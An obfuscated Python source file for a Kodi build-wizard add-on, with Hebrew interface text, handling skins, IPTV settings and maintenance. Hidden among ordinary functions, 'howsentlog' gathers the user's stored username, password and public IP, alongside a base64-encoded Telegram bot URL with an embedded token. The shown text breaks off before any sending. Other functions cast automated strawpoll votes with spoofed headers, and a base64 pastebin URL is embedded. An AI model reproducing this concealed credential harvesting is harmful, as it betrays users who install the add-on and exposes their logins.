# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
IPTVSIMPL18 =uservar .IPTVSIMPL18 #line:219
IPTVSIMPL18PC =uservar .IPTVSIMPL18PC #line:220
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:221
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:222
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:223
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:224
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:225
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:226
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:227
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:228
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:229
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:230
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:231
LOGFILES =wiz .LOGFILES #line:232
TRAKTID =traktit .TRAKTID #line:233
DEBRIDID =debridit .DEBRIDID #line:234
LOGINID =loginit .LOGINID #line:235
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:236
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:237
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:238
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:239
fullsecfold =xbmc .translatePath ('special://home')#line:240
addons_folder =os .path .join (fullsecfold ,'addons')#line:242
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:244
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:246
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:248
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:249
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:250
def MainMenu ():#line:257
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:259
def skinWIN ():#line:260
	idle ()#line:261
	OO0000O0OOOO0O0O0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:262
	O0OO0OOO000OOO000 =[];OOOO0O000O0O0O0O0 =[]#line:263
	for OOOO0OOO0O0OO0OOO in sorted (OO0000O0OOOO0O0O0 ,key =lambda OO0O000O0O000OO00 :OO0O000O0O000OO00 ):#line:264
		O000000OO0OOO0O00 =os .path .split (OOOO0OOO0O0OO0OOO [:-1 ])[1 ]#line:265
		OOO0OOO0000OO00OO =os .path .join (OOOO0OOO0O0OO0OOO ,'addon.xml')#line:266
		if os .path .exists (OOO0OOO0000OO00OO ):#line:267
			O0O00000OOO00OOOO =open (OOO0OOO0000OO00OO )#line:268
			O000O0O00OO0OO0O0 =O0O00000OOO00OOOO .read ()#line:269
			O00000O0O0O000OOO =parseDOM2 (O000O0O00OO0OO0O0 ,'addon',ret ='id')#line:270
			O000OOOO000OO00OO =O000000OO0OOO0O00 if len (O00000O0O0O000OOO )==0 else O00000O0O0O000OOO [0 ]#line:271
			try :#line:272
				O00OOOOO000O0OOO0 =xbmcaddon .Addon (id =O000OOOO000OO00OO )#line:273
				O0OO0OOO000OOO000 .append (O00OOOOO000O0OOO0 .getAddonInfo ('name'))#line:274
				OOOO0O000O0O0O0O0 .append (O000OOOO000OO00OO )#line:275
			except :#line:276
				pass #line:277
	OO0000OO000O00000 =[];OO0O000O0O0000OO0 =0 #line:278
	OOO00OO0O0OOO0O0O =["Current Skin -- %s"%currSkin ()]+O0OO0OOO000OOO000 #line:279
	OO0O000O0O0000OO0 =DIALOG .select ("Select the Skin you want to swap with.",OOO00OO0O0OOO0O0O )#line:280
	if OO0O000O0O0000OO0 ==-1 :return #line:281
	else :#line:282
		OO0O0OO000O0OOO00 =(OO0O000O0O0000OO0 -1 )#line:283
		OO0000OO000O00000 .append (OO0O0OO000O0OOO00 )#line:284
		OOO00OO0O0OOO0O0O [OO0O000O0O0000OO0 ]="%s"%(O0OO0OOO000OOO000 [OO0O0OO000O0OOO00 ])#line:285
	if OO0000OO000O00000 ==None :return #line:286
	for O000O0O000O0O000O in OO0000OO000O00000 :#line:287
		swapSkins (OOOO0O000O0O0O0O0 [O000O0O000O0O000O ])#line:288
def currSkin ():#line:290
	return xbmc .getSkinDir ('Container.PluginName')#line:291
def swapSkins (OOO00OO0OO0O0O0O0 ,title ="Error"):#line:292
	OOO0O0000O0O0OOOO ='lookandfeel.skin'#line:293
	OO0O0O0OOO0O0OOO0 =OOO00OO0OO0O0O0O0 #line:294
	O0OOO0000O00OOO0O =getOld (OOO0O0000O0O0OOOO )#line:295
	O000000O00OOO00O0 =OOO0O0000O0O0OOOO #line:296
	setNew (O000000O00OOO00O0 ,OO0O0O0OOO0O0OOO0 )#line:297
	O0OOO0O000000OOOO =0 #line:298
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOO0O000000OOOO <100 :#line:299
		O0OOO0O000000OOOO +=1 #line:300
		xbmc .sleep (1 )#line:301
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:302
		xbmc .executebuiltin ('SendClick(11)')#line:303
	return True #line:304
def getOld (O0OO0OOOOO00000O0 ):#line:306
	try :#line:307
		O0OO0OOOOO00000O0 ='"%s"'%O0OO0OOOOO00000O0 #line:308
		OOOO00O000OOO000O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0OO0OOOOO00000O0 )#line:309
		O0OO000OOOOO0000O =xbmc .executeJSONRPC (OOOO00O000OOO000O )#line:311
		O0OO000OOOOO0000O =simplejson .loads (O0OO000OOOOO0000O )#line:312
		if O0OO000OOOOO0000O .has_key ('result'):#line:313
			if O0OO000OOOOO0000O ['result'].has_key ('value'):#line:314
				return O0OO000OOOOO0000O ['result']['value']#line:315
	except :#line:316
		pass #line:317
	return None #line:318
def setNew (OO0000OO00O0OOOOO ,O0000000O0OOOO0OO ):#line:321
	try :#line:322
		OO0000OO00O0OOOOO ='"%s"'%OO0000OO00O0OOOOO #line:323
		O0000000O0OOOO0OO ='"%s"'%O0000000O0OOOO0OO #line:324
		OOOOOOOOO000O0000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(OO0000OO00O0OOOOO ,O0000000O0OOOO0OO )#line:325
		OOO00O000O00O00O0 =xbmc .executeJSONRPC (OOOOOOOOO000O0000 )#line:327
	except :#line:328
		pass #line:329
	return None #line:330
def idle ():#line:331
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:332
def resetkodi ():#line:334
		if xbmc .getCondVisibility ('system.platform.windows'):#line:335
			O00OOO000OO0OO0O0 =xbmcgui .DialogProgress ()#line:336
			O00OOO000OO0OO0O0 .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:339
			O00OOO000OO0OO0O0 .update (0 )#line:340
			for O0O00OO0O00OOOOOO in range (5 ,-1 ,-1 ):#line:341
				time .sleep (1 )#line:342
				O00OOO000OO0OO0O0 .update (int ((5 -O0O00OO0O00OOOOOO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0O00OO0O00OOOOOO ),'')#line:343
				if O00OOO000OO0OO0O0 .iscanceled ():#line:344
					from resources .libs import win #line:345
					return None ,None #line:346
			from resources .libs import win #line:347
		else :#line:348
			O00OOO000OO0OO0O0 =xbmcgui .DialogProgress ()#line:349
			O00OOO000OO0OO0O0 .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:352
			O00OOO000OO0OO0O0 .update (0 )#line:353
			for O0O00OO0O00OOOOOO in range (5 ,-1 ,-1 ):#line:354
				time .sleep (1 )#line:355
				O00OOO000OO0OO0O0 .update (int ((5 -O0O00OO0O00OOOOOO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0O00OO0O00OOOOOO ),'')#line:356
				if O00OOO000OO0OO0O0 .iscanceled ():#line:357
					os ._exit (1 )#line:358
					return None ,None #line:359
			os ._exit (1 )#line:360
def backtokodi ():#line:362
			wiz .kodi17Fix ()#line:363
			fix18update ()#line:364
			fix17update ()#line:365
def testcommand1 ():#line:367
    import requests #line:368
    O00OO000000OO0O0O ='18773068'#line:369
    O000OO00O00O0OOOO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O00OO000000OO0O0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:381
    O0OO0O0OOO000OOOO ='145273320'#line:383
    OO0O0O0OOOOO0OOO0 ='145272688'#line:384
    if ADDON .getSetting ("auto_rd")=='true':#line:385
        O000O00000OOOO0O0 =O0OO0O0OOO000OOOO #line:386
    else :#line:387
        O000O00000OOOO0O0 =OO0O0O0OOOOO0OOO0 #line:388
    O00OOOOO0OOO0O0OO ={'options':O000O00000OOOO0O0 }#line:392
    OO0O00OO0OOOO0OOO =requests .post ('https://www.strawpoll.me/'+O00OO000000OO0O0O ,headers =O000OO00O00O0OOOO ,data =O00OOOOO0OOO0O0OO )#line:394
def builde_Votes ():#line:395
   try :#line:396
        import requests #line:397
        OOOOOO0000O000OOO ='18773068'#line:398
        O0OO0000O000O00OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOOOOO0000O000OOO ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:410
        O0OO00OOOO0OOOOO0 ='145273320'#line:412
        O0000O00O0O00OOOO ={'options':O0OO00OOOO0OOOOO0 }#line:418
        OOOOO00000OOOO000 =requests .post ('https://www.strawpoll.me/'+OOOOOO0000O000OOO ,headers =O0OO0000O000O00OO ,data =O0000O00O0O00OOOO )#line:420
   except :pass #line:421
def update_Votes ():#line:422
   try :#line:423
        import requests #line:424
        OO00OO0O0OOO00O0O ='18773068'#line:425
        O0OOO0OO0OO0O0000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO00OO0O0OOO00O0O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:437
        OOOOOOOO00OOOO0O0 ='145273321'#line:439
        O00OOOO00O000O00O ={'options':OOOOOOOO00OOOO0O0 }#line:445
        OO0O0OOO000OOO0OO =requests .post ('https://www.strawpoll.me/'+OO00OO0O0OOO00O0O ,headers =O0OOO0OO0OO0O0000 ,data =O00OOOO00O000O00O )#line:447
   except :pass #line:448
def testcommand ():#line:452
    setautorealdebrid ()#line:453
def skin_homeselect ():#line:454
	try :#line:456
		OO0OOO0O00000000O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:457
		O00O0OO0OO0O000O0 =open (OO0OOO0O00000000O ,'r')#line:459
		O0OO00OO000O00OOO =O00O0OO0OO0O000O0 .read ()#line:460
		O00O0OO0OO0O000O0 .close ()#line:461
		OO0O000OOO0000OOO ='<setting id="HomeS" type="string(.+?)/setting>'#line:462
		O000OOO0OO0000000 =re .compile (OO0O000OOO0000OOO ).findall (O0OO00OO000O00OOO )[0 ]#line:463
		O00O0OO0OO0O000O0 =open (OO0OOO0O00000000O ,'w')#line:464
		O00O0OO0OO0O000O0 .write (O0OO00OO000O00OOO .replace ('<setting id="HomeS" type="string%s/setting>'%O000OOO0OO0000000 ,'<setting id="HomeS" type="string"></setting>'))#line:465
		O00O0OO0OO0O000O0 .close ()#line:466
	except :#line:467
		pass #line:468
def autotrakt ():#line:471
    OOOOOOO0OOO000OOO =(ADDON .getSetting ("auto_trk"))#line:472
    if OOOOOOO0OOO000OOO =='true':#line:473
       from resources .libs import trk_aut #line:474
def traktsync ():#line:476
     OO0OOOO000O0O000O =(ADDON .getSetting ("auto_trk"))#line:477
     if OO0OOOO000O0O000O =='true':#line:478
       from resources .libs import trk_aut #line:481
     else :#line:482
        ADDON .openSettings ()#line:483
def imdb_synck ():#line:485
   try :#line:486
     O0OOOOOO0OOO000OO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:487
     OO0O000O0OO000OO0 =xbmcaddon .Addon ('plugin.video.gaia')#line:488
     O0OO0OOOO000O0OO0 =(ADDON .getSetting ("imdb_sync"))#line:489
     OO00OOO0O0OO0O0O0 ="imdb.user"#line:490
     OO00OO0OO0O0OOO00 ="accounts.informants.imdb.user"#line:491
     O0OOOOOO0OOO000OO .setSetting (OO00OOO0O0OO0O0O0 ,str (O0OO0OOOO000O0OO0 ))#line:492
     OO0O000O0OO000OO0 .setSetting ('accounts.informants.imdb.enabled','true')#line:493
     OO0O000O0OO000OO0 .setSetting (OO00OO0OO0O0OOO00 ,str (O0OO0OOOO000O0OO0 ))#line:494
   except :pass #line:495
def dis_or_enable_addon (O0O00O00O0OOO00O0 ,O0000000OO00O0OOO ,enable ="true"):#line:497
    import json #line:498
    OO00OOO00O0O00O00 ='"%s"'%O0O00O00O0OOO00O0 #line:499
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O00O00O0OOO00O0 )and enable =="true":#line:500
        logging .warning ('already Enabled')#line:501
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O00O00O0OOO00O0 )#line:502
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O00O00O0OOO00O0 )and enable =="false":#line:503
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O00O00O0OOO00O0 )#line:504
    else :#line:505
        OO0OO0OO00OO0OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO00OOO00O0O00O00 ,enable )#line:506
        OO0O0OO0O0OO0O0OO =xbmc .executeJSONRPC (OO0OO0OO00OO0OO00 )#line:507
        OOO0OO0OOO00OO0OO =json .loads (OO0O0OO0O0OO0O0OO )#line:508
        if enable =="true":#line:509
            xbmc .log ("### Enabled %s, response = %s"%(O0O00O00O0OOO00O0 ,OOO0OO0OOO00OO0OO ))#line:510
        else :#line:511
            xbmc .log ("### Disabled %s, response = %s"%(O0O00O00O0OOO00O0 ,OOO0OO0OOO00OO0OO ))#line:512
    if O0000000OO00O0OOO =='auto':#line:513
     return True #line:514
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:515
def iptvset ():#line:518
  try :#line:519
    O0O0000O0OOO0OO00 =(ADDON .getSetting ("iptv_on"))#line:520
    if O0O0000O0OOO0OO00 =='true':#line:522
       if KODIV >=17 and KODIV <18 :#line:524
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:525
         OOO0O0O0000O0000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:526
         OOOO0OO0000OOO0OO =(ADDON .getSetting ("iptvUrl"))#line:528
         OOO0O0O0000O0000O .setSetting ('m3uUrl',OOOO0OO0000OOO0OO )#line:529
         O0OOOOOO0O0O0O00O =(ADDON .getSetting ("epg_Url"))#line:530
         OOO0O0O0000O0000O .setSetting ('epgUrl',O0OOOOOO0O0O0O00O )#line:531
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:534
         iptvsimpldownpc ()#line:535
         wiz .kodi17Fix ()#line:536
         xbmc .sleep (1000 )#line:537
         OOO0O0O0000O0000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:538
         OOOO0OO0000OOO0OO =(ADDON .getSetting ("iptvUrl"))#line:539
         OOO0O0O0000O0000O .setSetting ('m3uUrl',OOOO0OO0000OOO0OO )#line:540
         O0OOOOOO0O0O0O00O =(ADDON .getSetting ("epg_Url"))#line:541
         OOO0O0O0000O0000O .setSetting ('epgUrl',O0OOOOOO0O0O0O00O )#line:542
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:544
         iptvsimpldown ()#line:545
         wiz .kodi17Fix ()#line:546
         xbmc .sleep (1000 )#line:547
         OOO0O0O0000O0000O =xbmcaddon .Addon ('pvr.iptvsimple')#line:548
         OOOO0OO0000OOO0OO =(ADDON .getSetting ("iptvUrl"))#line:549
         OOO0O0O0000O0000O .setSetting ('m3uUrl',OOOO0OO0000OOO0OO )#line:550
         O0OOOOOO0O0O0O00O =(ADDON .getSetting ("epg_Url"))#line:551
         OOO0O0O0000O0000O .setSetting ('epgUrl',O0OOOOOO0O0O0O00O )#line:552
  except :pass #line:553
def howsentlog ():#line:560
       try :#line:561
          import json #line:562
          O00OOOOO000000OOO =(ADDON .getSetting ("user"))#line:563
          OOO0O00O000O0O00O =(ADDON .getSetting ("pass"))#line:564
          O0O000O00OOOO00O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:565
          O0O000O000OO00O00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:567
          OOOO00OOOOO0OOO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:568
          OOOOO0O000O000000 =str (json .loads (OOOO00OOOOO0OOO00 )['ip'])#line:569
          O00OO00OO0O0OOOO0 =O00OOOOO000000OOO #line:570
          OO0OOOO0OO0OOO000 =OOO0O00O000O0O00O #line:571
          import socket #line:573
